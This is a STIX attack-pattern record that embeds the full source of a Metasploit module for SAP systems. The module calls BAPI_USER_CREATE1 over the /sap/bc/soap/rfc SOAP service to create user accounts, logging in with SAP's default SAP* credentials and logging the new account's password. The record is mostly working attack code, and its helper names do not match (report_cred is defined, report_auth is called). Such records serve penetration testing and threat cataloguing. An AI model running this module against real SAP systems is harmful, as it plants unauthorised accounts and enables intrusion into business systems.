{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4b4d99db-b583-42df-8e23-29bd289c6f25",
    "created": "2024-08-14T16:27:01.274664Z",
    "modified": "2024-08-14T16:27:01.274668Z",
    "name": "SAP /sap/bc/soap/rfc SOAP Service BAPI_USER_CREATE1 Function User Creation",
    "description": " This module makes use of the BAPI_USER_CREATE1 function, through the SOAP /sap/bc/soap/rfc service, for creating/modifying users on a SAP.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/sap/sap_soap_bapi_user_create1.rb",
            "external_id": "sap_soap_bapi_user_create1.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# This module is based on, inspired by, or is a port of a plugin available in\n# the Onapsis Bizploit Opensource ERP Penetration Testing framework -\n# http://www.onapsis.com/research-free-solutions.php.\n# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts\n# in producing the Metasploit modules and was happy to share his knowledge and\n# experience - a very cool guy. I'd also like to thank Chris John Riley,\n# Ian de Villiers and Joris van de Vis who have Beta tested the modules and\n# provided excellent feedback. Some people just seem to enjoy hacking SAP :)\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name' => 'SAP /sap/bc/soap/rfc SOAP Service BAPI_USER_CREATE1 Function User Creation',\n      'Description' => %q{\n          This module makes use of the BAPI_USER_CREATE1 function, through the SOAP\n        /sap/bc/soap/rfc service, for creating/modifying users on a SAP.\n      },\n      'References' =>\n        [\n          [ 'URL', 'https://labs.f-secure.com/tools/sap-metasploit-modules/' ]\n        ],\n      'Author' =>\n        [\n          'Agnivesh Sathasivam',\n          'nmonkee'\n        ],\n      'License' => MSF_LICENSE\n    )\n    register_options([\n      Opt::RPORT(8000),\n      OptString.new('CLIENT', [true, 'SAP client', '001']),\n      OptString.new('HttpUsername', [true, 'Username', 'SAP*']),\n      OptString.new('HttpPassword', [true, 'Password', '06071992']),\n      OptString.new('BAPI_FIRST',[true,'First name','John']),\n      OptString.new('BAPI_LAST',[true,'Last name','Doe']),\n      OptString.new('BAPI_PASSWORD',[true,'Password for the account (Default is msf1234)','msf1234']),\n      OptString.new('BAPI_USER',[true,'Username for the account (Username in upper case only. Default is MSF)', 'MSF'])\n      ])\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def run_host(ip)\n    data = '<?xml version=\"1.0\" encoding=\"utf-8\" ?>'\n    data << '<env:Envelope xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:env=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">'\n    data << '<env:Body>'\n    data << '<n1:BAPI_USER_CREATE1 xmlns:n1=\"urn:sap-com:document:sap:rfc:functions\" env:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">'\n    data << '<ADDRESS>'\n    data << '<FIRSTNAME>' + datastore['BAPI_FIRST'] + '</FIRSTNAME>'\n    data << '<LASTNAME>' + datastore['BAPI_LAST'] + '</LASTNAME>'\n    data << '</ADDRESS>'\n    data << '<PASSWORD>'\n    data << '<BAPIPWD>' + datastore['BAPI_PASSWORD'] + '</BAPIPWD>'\n    data << '</PASSWORD>'\n    data << '<USERNAME>' + datastore['BAPI_USER'] + '</USERNAME>'\n    data << '</n1:BAPI_USER_CREATE1>'\n    data << '</env:Body>'\n    data << '</env:Envelope>'\n    begin\n      print_status(\"[SAP] #{ip}:#{rport} - Attempting to create user '#{datastore['BAPI_USER']}' with password '#{datastore['BAPI_PASSWORD']}'\")\n\n      res = send_request_cgi({\n        'uri' => '/sap/bc/soap/rfc',\n        'method' => 'POST',\n        'data' => data,\n        'cookie' => \"sap-usercontext=sap-language=EN&sap-client=#{datastore['CLIENT']}\",\n        'ctype' => 'text/xml; charset=UTF-8',\n        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),\n        'headers' => {\n          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',\n        },\n        'encode_params' => false,\n        'vars_get' => {\n          'sap-client'    => datastore['CLIENT'],\n          'sap-language'  => 'EN'\n        }\n      })\n      if res and res.code == 200\n        if res.body =~ /<h1>Logon failed<\\/h1>/\n          print_error(\"[SAP] #{ip}:#{rport} - Logon failed\")\n          return\n        elsif res.body =~ /faultstring/\n          error = []\n          error.push(res.body.scan(%r{<faultstring>(.*?)</faultstring>}))\n          print_error(\"[SAP] #{ip}:#{rport} - #{error.join().chomp}\")\n          return\n        else\n          print_good(\"[SAP] #{ip}:#{rport} - User '#{datastore['BAPI_USER']}' with password '#{datastore['BAPI_PASSWORD']}' created\")\n          report_auth(\n            ip: ip,\n            port: rport,\n            service_name: 'sap',\n            user: datastore['BAPI_USER'],\n            password: datastore['BAPI_PASSWORD'],\n            proof: res.body\n          )\n          return\n        end\n      else\n        print_error(\"[SAP] #{ip}:#{rport} - Unknown Error\")\n        if res\n          print_error(\"[SAP] #{ip}:#{rport} - Error code: #{res.code}\")\n          print_error(\"[SAP] #{ip}:#{rport} - Error message: #{res.message}\")\n        end\n        return\n      end\n    rescue ::Rex::ConnectionError\n      print_error(\"[SAP] #{ip}:#{rport} - Unable to connect\")\n      return\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}